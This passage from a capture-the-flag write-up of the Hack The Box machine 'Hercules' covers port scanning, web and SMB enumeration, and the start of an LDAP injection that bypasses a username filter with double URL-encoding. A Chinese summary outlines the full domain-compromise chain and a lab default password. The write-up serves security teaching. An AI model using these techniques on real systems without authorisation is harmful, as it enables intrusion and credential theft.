---
title: "HTB: Hercules | 0xdf hacks stuff"
source: https://0xdf.gitlab.io/2026/09/21/htb-hercules.html
source_host: 0xdf.gitlab.io
clip_date: 2026-09-21T20:22:20+08:00
trace_id: e327cbc9-580c-4cdc-b5d9-71d366be7305
content_hash: 2bf8898503b18b30dfe760248c6283b2a8e2a031d61fd85f0085df8c40ba103e
status: synced
tags:
  - 漏洞分析
  - 协议分析
series: null
feed_source: 0xdf·HTB/逆向
ai_summary: HTB Hercules 从双重编码 LDAP 注入入手，经机器密钥伪造 Cookie、证书服务 ESC3 与委派，最终 DCSync 拿下域控。
ai_summary_style: key-points
images_status:
  total: 60
  succeeded: 56
  failed_urls:
    - https://www.hackthebox.com/badge/image/499710
    - https://www.hackthebox.com/badge/image/260094
    - https://www.hackthebox.com/badge/image/1527613
    - https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260915124237987.png
notion_page_id: 3e275244-d011-81e1-8473-cafc94a786a3
ioc:
  cves:
    - CVE-2024-49019
  cwes: []
  hashes:
    - 0343a7088e8febcd6baf33636cb6ae65
    - 042ceee5da6879a9a75e4d39a8336539
    - 0676ae731f875f6ff8b3caeb8de61b2d
    - 07b98ea839deca57827cf6f3db757d368150878a55746ffc3804e9a672e17e23
    - 08cbc306325b2ef9da7bbdb85e528613
    - 1151ec1eca77cada4eb4ea598ee27148
    - 118757fa3074dfcb09ae0471a525872a
    - 12a6b6553154dfdad035d65479b804dc
    - 16574d42be04708b10478a0160c7d5bf
    - 17249fa7febeb8a84fc70d418e7c0c898ebef5583756cd498d547df3d9495211
    - 198de4ffffff05c776c29d983663d625
    - 1a687d999e4198a965918758c3f8cce1
    - 1ab0ef54279ae5799ecfbd6fda5da053b38200bfe4770a80bdb3875fbaa945db
    - 1d1b98effbbab0dd5ff56d95912d8a50
    - 1d8c49e44271b88f39f59bc6d535e0b5
    - 1dd5f287c078f9924ed52e93adfa1ccb
    - 1e2eea3b85497b239fcb13e60aec6d8a
    - 1e719fbfddd226da74f644eac9df7fd2
    - 201217d9fb7a22353ddf05badaa52304
    - 242b4b2960d5e45e02ae9575a06815c1038eecb748c070ba719a6f9dcd799e96
    - 28bc4f7ad97dec4c09022e13792a88fe
    - 2b0ddb8ee053dd81ab3f56ff1f3803e72fa5dad6106f2e3e5da910956c5ca05c
    - 2c2068e619487a205eab14e4d5bf5052c8376a36c78cd866b2cfdd9bf42d0ceb
    - 2db1f8377e4fbf4334179397fc97779a
    - 2ff374b80ec5a635f07fc2ff40ba8588
    - 2ff78d882f09acd03c05e139058acb66
    - 31abfeca89272d6ef2d916a371fc7c95
    - 31d6cfe0d16ae931b73c59d7e0c089c0
    - 35cbc508fcad4dd5bc96bce2f57cff20
    - 37c87d3c4074eecb525e563e088099c5
    - 38811dcdc8cd2cb426321c1500b21085
    - 38e613645139c52a90192e5e2835438b4e9e1b6d6e78dc2c9945d8cc58b8388c
    - 3b6be8c40a29ef71fd368b91305331a7
    - 3d5e7bf01a2b70286e032729ab8197a54bbc7efb
    - 3f48419ceb427233e0f785dadbc8061ea5321914aae7c48d9d37a9ccf24ddb9b
    - 40c14521627c473a0cefa7c81491443d98fd685b6758a79cab5e2b48d4fd349f
    - 42e31cb44638ae124cfb02a810a8d49c6376616c93ea51e43ac2f7799a668132
    - 44f4f0d4c7afe4fdc0368bdc0e81b7f9
    - 4642fc3846aa1beb5ab300ac26de6a30955461b85768b5226ed677e96fbc15f7
    - 46d8c64932678ef16f9f6725bc71a648
    - 48c4b10a55ddd53c38567b93d29854aac995af72fa3bc6c2a48a2fcd5694d8d0
    - 4acab4bc95d384f149e378377f9b0ea5
    - 4aef767f89075713fbe8003649da0326
    - 4d4922ac5f690741fd77d8937655a391
    - 4e8151abee9601cbe483074e7b4f81c42e84212c6643deb1e7185121f56096d1
    - 508b761cb4a74d26a0c1c6c6c1cffb83
    - 51403f6d7e2f363eab47e5945b367357
    - 53e86e206756760f7399f652f22c16f1
    - 55ace1e82eaf785b3c92429725ff6721
    - 55e2737cb7ee0780cfbd9bcbfd1a931797774e8ed5c9586366ddf66fa6c59b30
    - 5664d1352a5ad8107f4221c802187958
    - 56855ee6b7570edefde6ac262200756e
    - 5710dab9467947e446f654672ff98d84
    - 5809e5fc2ca162d909b15c62d7c3707c
    - 58ea15d4f45d6e8c95613774f2a520ab
    - 59402b2d1610a6aef3b2079a9366048b
    - 59a5880cf9d8be2b955ae135494077d61fab893638eea633eab4b5c81e784571
    - 5a87a338af05781b237894a70dc1634ec2228d7951e344f6c1109f375a3d38ec
    - 609b2cd845b751ebee40d729693f2fea
    - 60fc61cab84a22fb214819ce20c12e1c
    - 62ff786d017770f69241f04296a65858ffc17976e5f23c623a98ac7a214d86c0
    - 6377f37def6a599880dc680a895976b18787c5a9c7d50a7d04fe8cd106c95122
    - 68f03b6856cf02e7c1ddac0758ca6b25
    - 691f532656d93730b32c68e5410fe549
    - 6d235072f7e9d1ebf86ce618f95efd13
    - 6d25866356feeea0abf920fd58fccf03
    - 7170f9af3c1640078fef8fba9fc962aa
    - 72302a981e2fdfbb93a227dccbf907ee
    - 72bc6bb48c7c5312703924899fc60cc3
    - 75a83e8aa1b31e425f01c91f3ac5e049
    - 774fec322580dc16e52c7d51e0674f0ed3914a22e4eb0113ab0fba71840b018a
    - 77660edd07df04b5e3b827308d628f1b
    - 7ee4577fd299aa0fa5b8a0643426ff61501f42201f769afce56d633f29044168
    - 85821cf6c8df5da4baec4cddb14dd489e2575d41
    - 865b66f58f0b3a528ba3b4fdf3f41c7a32df25bfde5b58f197fada5d854bba4f
    - 88fb79ee960899e23659745a482984b1f793703661c72e2409b9bd8b5326c8d0
    - 88fbca83c9c68e7be600052ecda89a647898937f966210cdb832f7c43f2ffd5f
    - 89f43c3e2e6f276159fdb2e2196bf37aa57c6a701a998829ce77b847e0c0347b
    - 8a65c74e8f0073babbfac6725c66cc3f
    - 90ccdd29525c3b6d29428f932f754171
    - 924ebb8d5e7f953241252cf64e84ee58
    - 92a0d209761f472c856f4f3ed9ef1359
    - 93c2c14e26f5e1ff7472cf3649764ae7158ddf4cd0b0fee17c51b5b7d5040039
    - 93d66010169946e498aef06eaf0b9ba2611f45b8e38aa0208fc0b067bd1d4668
    - 945211238ed2449b8a15dd12ce173963
    - 952294bde2537ad3568133085a74d4b2
    - 95e93701d05ee7b165c6999515710f85
    - 960127296ec121040cfabdab2655bd52
    - 96c1eecee203a3f461d73450cc2f8973c66e947ca2327adba6697188bedf6f1d
    - 977b7d37961eab09a8cf99b54f6870bc
    - 979c95cba656605aeb3c1141ea13c013
    - 989f931779b1379c6345b6e2773244a0
    - 9aaaedcb19e612216a2dac9badb3c210
    - 9eb027b76c9f9cf8fe0803258d1feb6692e8dc9ca33ca5e10c4e55d89f4fc0ee
    - a023eb224e137b1c28de1a50d12519d5
    - a1feb7b590184a9a5a43d65a25e89980
    - a3431716086f8b75686d235cab875b28d71a406834da2e13278abedb0138b0a6
    - a522ccba1e2e6eba9340fbd857e70f9a
    - a5c8685a88599eca1c544cdd8e9149c9
    - a5e77806c53a03e6cdc3e039c57651bc91fdb50a90456bbd6df3dbce4326b7e9
    - a9285c625af80519ad784729655ff325
    - aa9d05e554420b27186ffe97882303c2
    - aad3b435b51404eeaad3b435b51404ee
    - ae7fa93d07857c57a1f447a11639ca11c2c37975b8c7b7cc9a13c10dd1048b87
    - b0a7c3665d08afdb3c9e69d2da1ea86aa302e6bfa9c9c4a997d4949818a60239
    - b26c371ea0a71fa5c3c9ab53a343e9b962cd947cd3eb5861edae4ccc6b019581
    - b88e36f733e6b0d30ce43235ba89842b
    - bb32a35136321fb9cd41374a1a62b14a
    - bba073b6255e15b30ac6204d67933ad8
    - bbc81c6e239c77655128bdc1c344824c
    - bbe608565f201166999904e40c967c7b
    - bea623e82ebd8ece87122335ac204482dc6bc8485da564b70bc89068da971600
    - c23578256755003649011ee7c9fef7b2
    - c304abccef27cb190fb6cc99308408f5
    - c3315d44eee3e579e2e7b0a054b428b045b6b30f40ce0a1aa5676344f3fcafe8
    - c52bca3f1343c33bb37200a87a26e8046c03ac768744bc6568d9c653d7b0f5ea
    - c6058e481e35910accaf63a279e3932cc8bc4c1f79cee8ffad03c286234336ef
    - c9013d65e6f24316f3e2f77974740e09
    - ca009a69ebcff1792b1f3a2cb7dc9a57
    - ccd5e253768c410bb474a34f5a5182a514f3e5312518bec2652fe164f029f652
    - cd5f05ea75cb4a942fecf5f4562fd6bcb3a7dd19fc15a5f0a147bf3ff84b3753
    - cd914a62c5742dcd5cd1440228188045f8e173395210b23e2c8393d5f05fd1ad
    - ce9db3f7fe9967c384f4bb0f7b97960a
    - cf2505174768c1b74c1e924c867f18b6
    - cf2cf63f803c325c16b7a5231590a7ad
    - d398f20152253f26fdc9153c54d184a3
    - d40b3d0a9a87be374c9e042155cc47cdadbe5d1fab673ee46b81a170cd756586
    - d51bfa7ca7ea238c5c833d4e16493694a765ffdf49ea28b7ae210a4248e9e1c5
    - d5c8594cd155ad4d55ed928f8d158d33
    - d620c64ffab6d700658d26648c6c7b65
    - d75d7b181f5da8187032be2698f08fa068ae496e043efe75e004b485b11eab5b
    - d928f3e420736b8e51a2fb95473bf6d82327d8936d60003ec812ac70fd65d599
    - d98fd42e1c7e0c38b1cefd75923bbd077a9c7214348c05d5d7a4782e50441a52
    - d9bbef8adf738b68ff3ddf404d4883d381aa19f050d740178b98585cdd702609
    - dc0490ede5dfbee7ea7bca4eb7178a95
    - dc6d40433d403e925d4f1848ceeef91f
    - dfb77380594c4ce1a7ee3763929b0521
    - e2382e136cfc10abaf6827c30145a72a77b54a19ea835251e9f81f6fd687fc71
    - e420c6133c98dcdfa42a8b9ad80fa780d5dc55f0566d1ba46d99348095c28fd2
    - e5ffd06fa27b1580198631558b564a61
    - e8a5008fd4504f0720d572f59a877efb
    - e913bbe5bca77dda3c1ae1c2d612e031acc27c6c20dfb02b14844da62d074ee2
    - e98550eac32381d51c41517eefec1cd4446e3e9bd951e08ae3c066a096f3fc7d
    - e9d8de0b0543f65514f5caf5070d3385
    - edf4904330bb4a438a6adfd8b5597307
    - ef0e8c35557ed7790eb8499fc1c24fb6
    - f41817416bbdeec50057c3a321cfe641f4cba93efb8a2f24ab05bb5b315e235a
    - f4dc59aca79742a3b02960c4934f81ae
    - f66e40133789f42dc3c1d54077784c965a45fdd530261ba478eb18f3aba68952
    - f8eefb4959850a0deaf143a61287c424da7ebd8ee7ce3b634379b92fe237fa4e
    - f93584d24b6563ae5f706d97017beef9d1da0ed006cf8222f7d4cdee1a0228da
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> HTB Hercules 从双重编码 LDAP 注入入手，经机器密钥伪造 Cookie、证书服务 ESC3 与委派，最终 DCSync 拿下域控。
> 
> - **过滤绕过：** 前端正则禁止 `!"#&'()*+,\:;<=>?[]^`{|}~`，但把特殊字符做双重 URL 编码后即可送达后端，`a*` 与 `aaaa*` 返回不同错误提示，形成可盲注的 LDAP oracle。
> - **限流绕过：** 429 由 `__RequestVerificationToken` Cookie 与页面内 CSRF token 两者共同决定，重新请求 `/Login` 并同时替换二者就能在冷却期内继续爆破；脚本约 24 分钟枚举出全部可登录用户，并从 johnathan.j 的 description 读出默认口令 `change*th1s_p@ssw()rd!!`，该口令实际对 ken.w 有效。
> - **提权链条：** 下载处理器的任意文件读取泄露站点 machineKey，据此伪造带 Web Administrators 角色的认证 Cookie 解锁上传；上传文档触发强制认证并破解，随后串联 shadow credentials、将账户移入 OU 纳入已有权限、对 CA 的 ESC3、清理任务去除 Admin 账户保护、利用委派抵达机器账户，secretsdump 后取 Administrator 的 AES key 换 TGT 登录 WinRM。
> - **环境要点：** 域 `hercules.htb`（DC 主机名 dc）禁用 NTLM，SMB 签名强制开启，用 Kerberos 前需 `ntpdate` 校正近 8 小时时钟偏差；root flag 在非默认位置 `C:\Users\Admin\Desktop\root.txt`；作为 natalie.a 运行的 `View Reports.ps1` 只用 LibreOffice 处理 `.odt`，被硬杀后残留 `.~lock.` 文件泄露打开者身份。

[HTB: Hercules](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)

![](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/hercules-cover.webp)

Hercules is a Windows domain controller running an ASP.NET site. I’ll slip past the filters to an LDAP injection, and with a rate limit bypass, I’ll brute force the directory and pull a default password out of a user description. An arbitrary file read in the download handler leaks the machine key from the site’s configuration, which lets me forge an authentication cookie carrying the Web Administrators role and unlock the file upload. An uploaded document coerces an authentication attempt that cracks, opening a long chain of Active Directory abuse that runs through shadow credentials, moving an account into an organizational unit to bring it under rights I already hold, and ESC3 against the certificate authority. Finally I’ll trigger a cleanup task that strips admin protections from a privileged account, then abuse delegation to reach the machine account that can dump the domain.

## Box Info

[![Hercules](https://0xdf.gitlab.io/icons/box-hercules.webp)](https://hackthebox.com/machines/hercules)

[Hercules](https://hackthebox.com/machines/hercules)

Insane

Retire Date 11 Sep 2026

OS ![Windows](https://0xdf.gitlab.io/icons/Windows.webp)

Rated Difficulty ![Rated difficulty for Hercules](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/hercules-diff.webp)

![Rated difficulty for Hercules](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/064f0a2e7b3f4bcb.png)

Radar Graph ![Radar chart for Hercules](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/hercules-radar.webp)

![Radar chart for Hercules](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/a48b93470e1e651d.png)

User

11:42:22 [f69](https://app.hackthebox.com/users/499710)

![⚠️ 图片托管失败 · f69](https://www.hackthebox.com/badge/image/499710)

Root

17:50:59 [NLTE](https://app.hackthebox.com/users/260094)

![⚠️ 图片托管失败 · NLTE](https://www.hackthebox.com/badge/image/260094)

Creator [birkk](https://app.hackthebox.com/users/1527613)

![⚠️ 图片托管失败 · birkk](https://www.hackthebox.com/badge/image/1527613)

Scenario

The root flag can be found in the non-default location, C:\\Users\\Admin\\Desktop.

## Recon

### Initial Scanning

`nmap` finds 21 open TCP ports:

```css
oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.129.242.196
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-14 04:04 UTC
Nmap scan report for 10.129.242.196
Host is up, received syn-ack ttl 127 (0.021s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
443/tcp   open  https            syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5986/tcp  open  wsmans           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
62482/tcp open  unknown          syn-ack ttl 127
62491/tcp open  unknown          syn-ack ttl 127
64492/tcp open  unknown          syn-ack ttl 127
64508/tcp open  unknown          syn-ack ttl 127

Nmap done: 1 IP address (1 host up) scanned in 13.37 seconds
oxdf@hacky$ sudo nmap -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5986,9389,49664,49668,62482,62491,64492,64508 -sCV 10.129.242.196
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-14 04:06 UTC
Nmap scan report for 10.129.242.196
Host is up (0.021s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to https://10.129.242.196/
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-13 20:06:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: TLS randomness does not represent time
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Hercules Corp
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=hercules.htb
| Subject Alternative Name: DNS:hercules.htb
| Not valid before: 2024-12-04T01:34:56
|_Not valid after:  2034-12-04T01:44:56
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
62482/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
62491/tcp open  msrpc         Microsoft Windows RPC
64492/tcp open  msrpc         Microsoft Windows RPC
64508/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -7h59m59s
| smb2-time:
|   date: 2026-09-13T20:07:40
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.95 seconds
```

The box shows many of the ports associated with a [Windows Domain Controller](https://0xdf.gitlab.io/cheatsheets/os#windows-domain-controller). The domain is `hercules.htb`, and the hostname is `DC`.

There’s also a webserver. On port 80 it’s redirecting to HTTPS on 443.

I’ll use `netexec` to make a `hosts` file entry and put it at the top of my `/etc/hosts` file:

```bash
oxdf@hacky$ netexec smb 10.129.242.196 --generate-hosts-file hosts
SMB         10.129.242.196  445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
oxdf@hacky$ cat hosts /etc/hosts | sudo sponge /etc/hosts
oxdf@hacky$ head -1 /etc/hosts
10.129.242.196     dc.hercules.htb hercules.htb dc
```

All of the ports show a TTL of 127, which matches the [expected TTL](https://0xdf.gitlab.io/cheatsheets/os#os-identification) for Windows one hop away. That said, IIS could be proxying for VMs or containers and it typically wouldn’t show up here.

`nmap` notes a clock skew, so I’ll want to make sure to run `sudo ntpdate DC.hercules.htb` before any actions that use Kerberos auth.

### hercules.htb - TCP 443

#### Site

The site is for a web design / development company:

 ![image-20260913214403330](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260913214403330.webp)![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

The contact form at the bottom does send a POST message with the info:

```
POST / HTTP/1.1
Host: hercules.htb
Cookie: __RequestVerificationToken=eQaRPPVB-JMcN2VFy6dtDVlp38VzhlS6OmdQnac1QeDFNPjEQYdDxZUKMJVuABsKUQL8_wEN-3ATeRR8w1TG660mPl0Zs2rMZ9m870xxBS01
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:155.0) Gecko/20100101 Firefox/155.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 193
Origin: https://hercules.htb
Referer: https://hercules.htb/
Upgrade-Insecure-Requests: 1
Connection: keep-alive

__RequestVerificationToken=y_PWIqK0wpWSxH_2Gk7jaH90FjtMUL2pqeymfKKY7b6a7omQb8idqLbfnjpYDQ58ZE9DVLL7c_FWUAXYyKvXDFPkDYus-AZ97bhxLoKYhXE1&Name=0xdf&Email=0xdf%400xdf.htb&Subject=test&Message=test
```

And returns a message suggesting that it may be processed on the backend:

![image-20260913214550257](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5af75d13c085e6dd.png)

![image-20260913214550257](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260913214550257.webp)

All of the links on the page lead to other places on the page.

#### Tech Stack

The HTTP response headers show IIS:

```yaml
HTTP/2 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/10.0
X-Frame-Options: SAMEORIGIN
Set-Cookie: __RequestVerificationToken=eQaRPPVB-JMcN2VFy6dtDVlp38VzhlS6OmdQnac1QeDFNPjEQYdDxZUKMJVuABsKUQL8_wEN-3ATeRR8w1TG660mPl0Zs2rMZ9m870xxBS01; path=/; HttpOnly
Date: Sun, 13 Sep 2026 20:15:44 GMT
Content-Length: 27342
```

There’s an ASP.NET anti-CSRF cookie set.

Guessing at file extensions, there are a handful of different responses. `/index.html` and `/index.php` return an empty 404 response:

```
HTTP/2 404 Not Found
Server: Microsoft-IIS/10.0
Date: Mon, 14 Sep 2026 01:48:50 GMT
Content-Length: 0
```

`/asdas` returns a 404 page that’s new to me:

![image-20260913215049189](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1b3dd288b47a84bb.png)

![image-20260913215049189](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260913215049189.webp)

`/index.` (with a “.” on the end) returns an [ASP.NET default 404](https://0xdf.gitlab.io/cheatsheets/404#aspnet):

![image-20260913215211967](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260913215211967.webp)

This gives the.NET framework and ASP.NET version. I can also conclude that this is IIS sitting in front of an ASP.NET MVC (model-view-controller) application. Each of the three 404s is coming from a different layer. The 0 byte 404 is IIS answering on its own, before the request ever reaches.NET. The polished custom 404 is the application’s own error page. The `/index.` 404 lands in between, where the trailing dot gets the request classified as a file-style request rather than an MVC route, so the ASP.NET runtime handles it and the application’s error page never runs.

The main page loads as `/index`.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x aspx` since I know the site is ASP.NET, `--dont-extract-links` because this result gets very loud with that, `-C 404` because the auto-filter misses a bunch of these, a lowercase wordlist because IIS doesn’t care about case, and `--depth 1` because the recursive search goes down a bunch of paths that are really just single endpoints:

```bash
oxdf@hacky$ feroxbuster -u https://hercules.htb -x aspx -k -C 404 --dont-extract-links --depth 1 -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
                                                                                                                                       
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://hercules.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💲  Extensions            │ [aspx]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 1
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       19l       31w      473c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      467l     1691w    27342c https://hercules.htb/
200      GET       53l      162w     3213c https://hercules.htb/login
301      GET        2l       10w      152c https://hercules.htb/content => https://hercules.htb/content/
302      GET        3l        8w      141c https://hercules.htb/home => https://hercules.htb/Login?ReturnUrl=%2fhome
200      GET      467l     1691w    27342c https://hercules.htb/index
200      GET      467l     1691w    27342c https://hercules.htb/default
400      GET        6l       26w      324c https://hercules.htb/error%1F_log
400      GET        6l       26w      324c https://hercules.htb/error%1F_log.aspx
[####################] - 71s    26584/26584   0s      found:8       errors:0      
[####################] - 71s    26584/26584   376/s   https://hercules.htb/
```

There are a few interesting paths to check out. `/default` returns the same page as `/` and `/index`. `/content` redirects to `/content/` which then returns 404.

`/home` is redirecting to `/Login`, suggesting that’s the authenticated page.

`/login` returns a login page:

![image-20260914070355353](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1727635a724002ff.png)

![image-20260914070355353](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260914070355353.webp)

Failed logins return “Invalid login attempt” regardless of the username I give it, suggesting I’m not able to guess a valid username or that it’s doing a good job of not being a username oracle.

If I try login attempts too quickly, I get a custom 429 page with a countdown timer:

![image-20260914071841430](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/960029957b968c47.png)

![image-20260914071841430](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260914071841430.webp)

This only seems to apply to the login page, as I had no issues with `feroxbuster`.

### SMB - TCP 445

`netexec` shows that SMB signing is enabled:

```css
oxdf@hacky$ netexec smb hercules.htb
SMB         10.129.242.196  445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
```

I’m not able to list any shares:

```css
oxdf@hacky$ netexec smb hercules.htb --shares
SMB         10.129.242.196  445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         10.129.242.196  445    dc               [-] Error enumerating shares: [Errno 32] Broken pipe
oxdf@hacky$ netexec smb hercules.htb -u guest -p '' --shares
SMB         10.129.242.196  445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         10.129.242.196  445    dc               [-] hercules.htb\guest: STATUS_NOT_SUPPORTED 
```

`STATUS_NOT_SUPPORTED` typically means that NTLM is disabled on the domain. I’ll try with Kerberos, but it fails as well:

```css
oxdf@hacky$ netexec smb hercules.htb -u guest -p '' -k --shares
SMB         hercules.htb    445    hercules         [*]  x64 (name:hercules) (domain:htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         hercules.htb    445    hercules         [-] htb\guest: [Errno Connection error (HTB:88)] [Errno -2] Name or service not known
```

I’ll have to come back once I have creds.

## Auth as ken.w

### LDAP Injection POC

The login form has an interesting validation built into it:

```html
<input class="input-validation-error form-control" data-val="true" data-val-regex="Invalid Username" data-val-regex-pattern="^[^!&quot;#&amp;&#39;()*+,\:;&lt;=>?[\]^`{|}~]+$" data-val-required="The Username field is required." id="Username" name="Username" type="text" value="" />
```

On the client-side, it won’t allow any of ``!"#&'()*+,\:;<=>?[]^`{|}~``. The entire submission must not include these.

There are a few different kinds of injection that these characters might prevent, like SQLI, LDAP injection, or command injection. Command injection in a login form seems very unlikely.

I’ll play with sending different characters in the username from Burp Repeater to see if this limit is enforced on the server. If I start with username admin and an empty password, the result is a message saying that the password is invalid:

![image-20260914173423614](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e351ded68554a163.png)

![image-20260914173423614](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260914173423614.webp)

If I add a single quote to the end of the username, it now rejects both:

![image-20260914173524213](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/afcd464327123ad0.png)

![image-20260914173524213](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260914173524213.webp)

If I URL-encode the single quote, it still fails:

![image-20260914173611423](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/434fb848e6e8a7a5.png)

![image-20260914173611423](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260914173611423.webp)

If I double URL-encode it, the username is good again:

